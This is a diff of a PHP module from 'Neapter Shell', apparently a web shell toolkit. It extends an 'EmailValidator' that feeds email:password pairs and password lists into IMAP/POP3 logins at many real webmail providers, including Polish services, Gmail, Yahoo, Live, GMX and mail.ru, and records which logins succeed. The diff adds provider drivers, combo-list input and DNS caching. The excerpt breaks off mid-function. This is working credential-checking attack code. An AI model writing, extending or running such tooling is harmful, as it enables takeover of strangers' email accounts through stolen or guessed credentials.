@@ -4,7 +4,7 @@
  * Neapter Shell
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
  * @license   http://www.gnu.org/licenses/gpl-3.0.txt
  */
@@ -13,7 +13,10 @@
  * Interface dla EmailValidator'a
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator
  */
 interface EmailValidatorInterface
 {
@@ -43,9 +46,12 @@ interface EmailValidatorInterface
  * Obsluga o2.pl
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://pomoc.o2.pl/poczta/programy/
+ * @link      http://pomoc.o2.pl/poczta/programy/
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverO2pl implements EmailValidatorInterface
 {
@@ -89,7 +95,7 @@ class EmailValidatorDriverO2pl implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{poczta.o2.pl:110/pop3}', $sUsername, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost( 'poczta.o2.pl' ) ), $sUsername, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -110,10 +116,13 @@ class EmailValidatorDriverO2pl implements EmailValidatorInterface
  * Obsluga wp.pl
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://poczta.wp.pl/info-pomoc-ustawienia.html?action=more&id=77
- * @link http://poczta.wp.pl/info-pomoc-ustawienia.html?action=more&id=27
+ * @link      http://poczta.wp.pl/info-pomoc-ustawienia.html?action=more&id=77
+ * @link      http://poczta.wp.pl/info-pomoc-ustawienia.html?action=more&id=27
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverWppl implements EmailValidatorInterface
 {
@@ -155,7 +164,7 @@ class EmailValidatorDriverWppl implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{pop3.wp.pl:110/pop3}', $sUsername, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost( 'imap.wp.pl' ) ), $sUsername, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -176,9 +185,12 @@ class EmailValidatorDriverWppl implements EmailValidatorInterface
  * Obsluga interia.pl
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://info.poczta.interia.pl/pomoc/artykuly,1276750,parametry-do-konfiguracji-programow-pocztowych
+ * @link      http://info.poczta.interia.pl/pomoc/artykuly,1276750,parametry-do-konfiguracji-programow-pocztowych
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverInteriapl implements EmailValidatorInterface
 {
@@ -232,7 +244,7 @@ class EmailValidatorDriverInteriapl implements EmailValidatorInterface
 		{
 			case 'interia.pl':
 			case 'interia.eu':
-				$sDomain = 'poczta.interia.pl';
+				$sHost = EmailValidator::getHost( 'poczta.interia.pl' );
 
 				if( $sDomain === 'interia.eu' )
 				{
@@ -241,16 +253,16 @@ class EmailValidatorDriverInteriapl implements EmailValidatorInterface
 
 				break ;
 			case 'poczta.fm':
-				$sDomain = 'www.poczta.fm';
+				$sHost = EmailValidator::getHost( 'www.poczta.fm' );
 				break ;
 			default:
-				$sDomain = 'poczta.vip.interia.pl';
+				$sHost = EmailValidator::getHost( 'poczta.vip.interia.pl' );
 				$sUsername = $sEmail;
 		}
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( sprintf( '{%s:110/pop3}', $sDomain ), $sUsername, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', $sHost ), $sUsername, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -271,10 +283,13 @@ class EmailValidatorDriverInteriapl implements EmailValidatorInterface
  * Obsluga onet.pl
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://poczta.onet.pl/pomoc/13224,0,27,6,14020,37,0,0,pomoc.html
- * @link http://poczta.onet.pl/oferta/opis_opcji.html
+ * @link      http://poczta.onet.pl/pomoc/13224,0,27,6,14020,37,0,0,pomoc.html
+ * @link      http://poczta.onet.pl/oferta/opis_opcji.html
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverOnetpl implements EmailValidatorInterface
 {
@@ -337,7 +352,7 @@ class EmailValidatorDriverOnetpl implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{pop3.poczta.onet.pl:110/pop3}', $sUsername, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost( 'imap.poczta.onet.pl' ) ), $sUsername, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -358,9 +373,12 @@ class EmailValidatorDriverOnetpl implements EmailValidatorInterface
  * Obsluga onet.pl
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://serwisy.gazeta.pl/Odnowa/0,87357,4782564.html#28
+ * @link      http://serwisy.gazeta.pl/Odnowa/0,87357,4782564.html#28
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverGazetapl implements EmailValidatorInterface
 {
@@ -406,7 +424,7 @@ class EmailValidatorDriverGazetapl implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{pop.gmail.com:995/pop3/ssl/novalidate-cert}', $sUsername, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost( 'pop.gmail.com' ) ), $sUsername, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -429,9 +447,12 @@ class EmailValidatorDriverGazetapl implements EmailValidatorInterface
  * IMAP i POP3 nie sa dostepne w wersji FREE
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://help.yahoo.com/l/pl/yahoo/mail/classic/mailplus/pop/pop-08.html
+ * @link      http://help.yahoo.com/l/pl/yahoo/mail/classic/mailplus/pop/pop-08.html
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverYahoocom implements EmailValidatorInterface
 {
@@ -494,7 +515,7 @@ class EmailValidatorDriverYahoocom implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{pop.mail.yahoo.com:110/pop3}', $sUsername, $sPassword, null, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost( 'imap.mail.yahoo.com' ) ), $sUsername, $sPassword, null, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -517,9 +538,12 @@ class EmailValidatorDriverYahoocom implements EmailValidatorInterface
  * Trzeba wlaczyc obsluge POP3 w panelu
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://mail.google.com/support/bin/answer.py?answer=13287
+ * @link      http://mail.google.com/support/bin/answer.py?answer=13287
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverGmailcom implements EmailValidatorInterface
 {
@@ -569,7 +593,7 @@ class EmailValidatorDriverGmailcom implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{pop.gmail.com:995/pop3/ssl/novalidate-cert}', $sUsername, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost( 'pop.gmail.com' ) ), $sUsername, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -590,10 +614,13 @@ class EmailValidatorDriverGmailcom implements EmailValidatorInterface
  * Obsluga Live.com
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://www.mydigitallife.info/hotmail-free-pop3-and-smtp-access-and-server-configuration-settings/
- * @link http://liveunplugged.wordpress.com/2010/03/12/hotmail-and-msn-accounts-pop3smtp-access/
+ * @link      http://www.mydigitallife.info/hotmail-free-pop3-and-smtp-access-and-server-configuration-settings/
+ * @link      http://liveunplugged.wordpress.com/2010/03/12/hotmail-and-msn-accounts-pop3smtp-access/
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverLivecom implements EmailValidatorInterface
 {
@@ -610,6 +637,8 @@ class EmailValidatorDriverLivecom implements EmailValidatorInterface
 			'hotmail.com',
 			'hotmail.de',
 			'hotmail.fr',
+			'hotmail.it',
+			'hotmail.co.jp',
 			'hotmail.co.uk',
 			'windowslive.com',
 			'live.com',
@@ -650,7 +679,7 @@ class EmailValidatorDriverLivecom implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{smtp.live.com:995/pop3/ssl/novalidate-cert}', $sEmail, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost( 'pop3.live.com' ) ), $sEmail, $sPassword, OP_SILENT, 5 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -673,9 +702,12 @@ class EmailValidatorDriverLivecom implements EmailValidatorInterface
  * Brak informacji na temat dlugosci hasla
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://konfiguracja.neostrada.pl/neo/help/konf_outlook.htm
+ * @link      http://konfiguracja.neostrada.pl/neo/help/konf_outlook.htm
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverNeostradapl implements EmailValidatorInterface
 {
@@ -713,7 +745,7 @@ class EmailValidatorDriverNeostradapl implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{smtp.live.com:110/pop3}', $sEmail, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost( 'poczta.neostrada.pl' ) ), $sEmail, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -736,9 +768,12 @@ class EmailValidatorDriverNeostradapl implements EmailValidatorInterface
  * Brak informacji na temat dlugosci hasla
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://ustaw.orange.pl/ust.aspx
+ * @link      http://ustaw.orange.pl/ust.aspx
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverOrangepl implements EmailValidatorInterface
 {
@@ -776,7 +811,7 @@ class EmailValidatorDriverOrangepl implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap =  imap_open( '{mail.orange.pl:110/pop3}', $sUsername, $sPassword, OP_SILENT, 1 );
+		$rImap =  imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost( 'mail.orange.pl' ) ), $sUsername, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -799,9 +834,12 @@ class EmailValidatorDriverOrangepl implements EmailValidatorInterface
  * Brak informacji na temat dlugosci hasla
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link http://www.poczta.pl
+ * @link      http://www.poczta.pl
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverPocztapl implements EmailValidatorInterface
 {
@@ -839,7 +877,7 @@ class EmailValidatorDriverPocztapl implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{mail.poczta.pl:110/pop3}', $sEmail, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost( 'mail.poczta.pl' ) ), $sEmail, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -860,9 +898,12 @@ class EmailValidatorDriverPocztapl implements EmailValidatorInterface
  * Obsluga plusnet.pl
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
  *
- * @link https://www.plusnet.pl/pomoc.html
+ * @link      https://www.plusnet.pl/pomoc.html
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
  */
 class EmailValidatorDriverPlusnetpl implements EmailValidatorInterface
 {
@@ -908,7 +949,7 @@ class EmailValidatorDriverPlusnetpl implements EmailValidatorInterface
 		/**
 		 * Wlidacja
 		 */
-		$rImap = @ imap_open( '{mail.plusnet.pl:110/pop3}', $sUsername, $sPassword, OP_SILENT, 1 );
+		$rImap = @ imap_open( sprintf( '{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost( 'mail.plusnet.pl' ) ), $sUsername, $sPassword, OP_SILENT, 1 );
 
 		/**
 		 * Zamykanie polaczenia
@@ -926,10 +967,449 @@ class EmailValidatorDriverPlusnetpl implements EmailValidatorInterface
 }
 
 /**
- * Wyjatki dla EmailValidator
+ * Obsluga web.de
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @link      https://registrierung.web.de/
+ * @link      https://hilfe.web.de/e-mail/pop3.html
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
+ */
+class EmailValidatorDriverWebde implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array
+		(
+			'web.de'
+		);
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( ! ( strlen( $sPassword ) >= 8 ) && ( strlen( $sPassword ) <= 40 ) )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost( 'pop3.web.de' ) ), $sEmail, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		 */
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga gmx.de
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @link      https://registrierung.web.de/
+ * @link      http://help.gmx.com/mail/overview/pop3/thunderbird3/
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
+ */
+class EmailValidatorDriverGmxde implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array
+		(
+			'gmx.de',
+			'gmx.at',
+			'gmx.ch',
+			'gmx.net'
+		);
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( strlen( $sPassword ) < 6 )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost( 'pop.gmx.com' ) ), $sEmail, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		*/
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga pino.pl
+ *
+ * @todo      untested
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @link      http://openid.pino.pl/app/konto-rejestracja
+ * @link      http://www.pino.pl/faq/informacje-ogolne-61
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
+ */
+class EmailValidatorDriverPinopl implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array
+		(
+			'pino.pl'
+		);
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Dlugosc loginu w serwisie
+		 */
+		if( ! ( strlen( $sUsername ) >= 3 ) && ( strlen( $sUsername ) <= 32 ) )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( ! ( strlen( $sPassword ) >= 4 ) && ( strlen( $sPassword ) <= 20 ) )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost( 'pop3.pino.pl' ) ), $sEmail, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		*/
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga inmail.pl
+ *
+ * @todo      untested
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @link      http://www2.inmail.pl/ClientOE.aspx
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
+ */
+class EmailValidatorDriverInmailpl implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array
+		(
+			'inmail.pl'
+		);
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Dlugosc loginu w serwisie
+		 */
+		if( ! ( strlen( $sUsername ) >= 3 ) && ( strlen( $sUsername ) <= 30 ) )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( ! ( strlen( $sPassword ) >= 4 ) && ( strlen( $sPassword ) <= 30 ) )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( sprintf( '{%s:995/pop3/ssl/novalidate-cert}', EmailValidator::getHost( 'pop3.inmail.pl' ) ), $sEmail, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		*/
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga gg.pl
+ *
+ * @todo      untested
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @link      http://www.gg.pl/info/rejestracja-aktualizacja-danych
+ * @link      http://poczta.gg.pl/lekcja/2
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
+ */
+class EmailValidatorDriverGgpl implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array
+		(
+			'gg.pl'
+		);
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( strlen( $sPassword ) < 6 )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( sprintf( '{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost( 'imap.gg.pl' ) ), $sEmail, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		*/
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * Obsluga mail.ru
+ *
+ * @todo      untested
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @link      http://help.mail.ru/mail-help/mailer/popsmtp
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\EmailValidator\Drivers
+ */
+class EmailValidatorDriverMailru implements EmailValidatorInterface
+{
+	/**
+	 * Lista domen, ktorych dotyczy dana regula
+	 *
+	 * @access public
+	 * @return array  lista hostow
+	 */
+	public function getHosts()
+	{
+		return array
+		(
+			'mail.ru',
+			'inbox.ru',
+			'list.ru',
+			'bk.ru'
+		);
+	}
+
+	/**
+	 * Sprawdzanie czy uzytkownik i haslo zgadzaja sie
+	 *
+	 * @access public
+	 * @param  string  $sEmail    Adres email
+	 * @param  string  $sUsername Nazwa uzytkownika (to co jest przed znakiem '@')
+	 * @param  string  $sPassword Haslo
+	 * @param  string  $sDomain   Nazwa domeny / hosta (to co jest za znakiem '@')
+	 * @return boolean            TRUE jezeli udalo sie zalogowac na skrzynke
+	 */
+	public function isValid( $sEmail, $sUsername, $sPassword, $sDomain )
+	{
+		/**
+		 * Dlugosc hasla w serwisie
+		 */
+		if( strlen( $sPassword ) < 6 )
+		{
+			return FALSE;
+		}
+
+		/**
+		 * Wlidacja
+		 */
+		$rImap = @ imap_open( sprintf( '{%s:993/imap/ssl/novalidate-cert}', EmailValidator::getHost( 'imap.mail.ru' ) ), $sEmail, $sPassword, OP_SILENT, 1 );
+
+		/**
+		 * Zamykanie polaczenia
+		*/
+		if( is_resource( $rImap ) )
+		{
+			imap_close( $rImap );
+
+			return TRUE;
+		}
+
+		return FALSE;
+	}
+
+}
+
+/**
+ * EmailValidator - Wyjatki
+ *
+ * @author    Krzysztof Otręba <krzotr@gmail.com>
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Tools\Exception
  */
 class EmailValidatorException extends Exception{}
 
@@ -937,7 +1417,10 @@ class EmailValidatorException extends Exception{}
  * Sprawdzanie czy przy uzyciu adresu email oraz hasla da sie zalogowac na skrzynke
  *
  * @author    Krzysztof Otręba <krzotr@gmail.com>
- * @copyright Copyright (c) 2011, Krzysztof Otręba
+ * @copyright Copyright (c) 2012, Krzysztof Otręba
+ *
+ * @package    NeapterShell
+ * @subpackage Tools
  */
 class EmailValidator
 {
@@ -982,6 +1465,31 @@ class EmailValidator
 	protected $bUsernamePassword = FALSE;
 
 	/**
+	 * Cache dla hostow, aby nie odpytywac ciagle serwerow DNS
+	 *
+	 * @static
+	 * @access protected
+	 * @var    protected
+	 */
+	protected static $aHostIp = array();
+
+	/**
+	 * Tryb gadatliwy
+	 *
+	 * @access protected
+	 * @var    boolean
+	 */
+	protected $bVerbose = FALSE;
+
+	/**
+	 * Sciezka do pliku wynikowego
+	 *
+	 * @access protected
+	 * @var    string
+	 */
+	protected $sOutputFile;
+
+	/**
 	 * Konstruktor
 	 *
 	 * @access public
@@ -1021,11 +1529,70 @@ class EmailValidator
 	}
 
 	/**
+	 * Reczne dodanie email:pass, czyszczenie tablicy z adresami
+	 *
+	 * @acess  public
+	 * @param  string        $sValue Email:pass
+	 * @return EmailValidator        Obiekt EmailValidator
+	 */
+	public function setEmailPassword( $sValue )
+	{
+		$this -> aEmails = array();
+
+		return $this -> addEmailPassword( $sValue );
+	}
+
+	/**
+	 * Reczne dodanie email:pass
+	 *
+	 * @acess  public
+	 * @param  string        $sValue Email:pass
+	 * @return EmailValidator        Obiekt EmailValidator
+	 */
+	public function addEmailPassword( $sValue )
+	{
+		/**
+		 * username:password
+		 */
+		if( strpos( $sValue, ':') === FALSE )
+		{
+			return $this;
+		}
+
+		$sEmail = strstr( strtolower( $sValue ), ':', TRUE );
+
+		/**
+		 * Adres email musi byc poprawny
+		 */
+		if( filter_var( $sEmail, FILTER_VALIDATE_EMAIL ) === FALSE )
+		{
+			return $this;
+		}
+
+		/**
+		 * Wstawianie adresu do tablicy
+		 */
+		$this -> aEmails[] = array
+		(
+			'email'    => $sEmail,
+			'username' => strstr( $sEmail, '@', TRUE ),
+			'domain'   => substr( $sEmail, strpos( $sEmail, '@' ) + 1 ),
+			'password' => substr( $sValue, strpos( $sValue, ':' ) + 1 ),
+			'line'     => $sValue
+		);
+
+		$this -> bVerbose = TRUE;
+		$this -> bUsernamePassword = TRUE;
+
+		return $this;
+	}
+
+	/**
 	 * Ustawienia pliku z haslami
 	 *
 	 * @acess  public
 	 * @param  string        $sValue Plik z haslami
-	 * @return EmailValidator         Obiekt EmailValidator
+	 * @return EmailValidator        Obiekt EmailValidator
 	 */
 	public function setPasswordsFile( $sValue )
 	{
@@ -1034,7 +1601,7 @@ class EmailValidator
 			throw new EmailValidatorException( 'Plik z hasłami nie istnieje' );
 		}
 
-		$this -> aPasswords = file( $sValue, FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES );
+		$this -> aPasswords = array_unique( file( $sValue, FILE_SKIP_EMPTY_LINES | FILE_IGNORE_NEW_LINES ) );
 
 		if( $this -> aPasswords === array( ) )
 		{
@@ -1144,6 +1711,69 @@ class EmailValidator
 	}
 
 	/**
+	 * Cachowanie adresow IP
+	 *
+	 * @access public
+	 * @param  string $sName Nazwa hosta
+	 * @return string        Adres IP
+	 */
+	public static function getHost( $sName )
+	{
+		if( ! isset( self::$aHostIp[ $sName ] ) )
+		{
+			self::$aHostIp[ $sName ] = gethostbyname( $sName );
+		}
+
